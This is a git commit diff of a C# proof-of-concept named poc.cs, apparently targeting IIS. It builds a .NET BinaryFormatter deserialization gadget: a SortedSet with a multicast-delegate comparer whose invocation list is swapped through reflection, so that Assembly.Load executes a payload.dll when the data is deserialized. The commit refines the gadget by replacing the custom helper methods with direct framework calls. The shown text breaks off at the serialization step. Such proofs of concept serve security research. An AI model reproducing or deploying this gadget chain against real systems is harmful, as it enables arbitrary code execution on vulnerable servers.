4cd23a2e9a26c91fde922494013f320cd6a98052
Charaf Eddine Aarab <110303356+CEAarab@users.noreply.github.com>
2025-09-10 15:24:24 +0200

    Update poc.cs

--- poc.cs
+++ poc.cs
@@ -10,35 +10,20 @@ namespace hawktraceiis
 {
     class Program
     {
-        static int CompareArrays(Array a, Array b)
-        {
-            return a.Length.CompareTo(b.Length);
-        }
-
-        static int LoadAssembly(Array a, Array b)
-        {
-            if (a is byte[] bytes)
-            {
-                Assembly.Load(bytes);
-            }
-            return 0;
-        }
-
         static void Main(string[] args)
         {
+            
             byte[] ASSEMBLY_BYTES = File.ReadAllBytes(@"payload.dll");
-            Delegate da = new Comparison<Array>(CompareArrays);
+            Delegate da = new Comparison<Array>(Array.IndexOf);
             Comparison<Array> d = (Comparison<Array>)MulticastDelegate.Combine(da, da);
             IComparer<Array> comp = Comparer<Array>.Create(d);
             SortedSet<Array> set = new SortedSet<Array>(comp);
             set.Add(ASSEMBLY_BYTES);
             set.Add("dummy".ToCharArray());
-            
             FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
             object[] invoke_list = d.GetInvocationList();
-            invoke_list[1] = new Comparison<Array>(LoadAssembly);
+            invoke_list[1] = new Func<byte[], Assembly>(Assembly.Load);
             fi.SetValue(d, invoke_list);
-            
             using (MemoryStream stream = new MemoryStream())
             {
                 BinaryFormatter formatter = new BinaryFormatter();
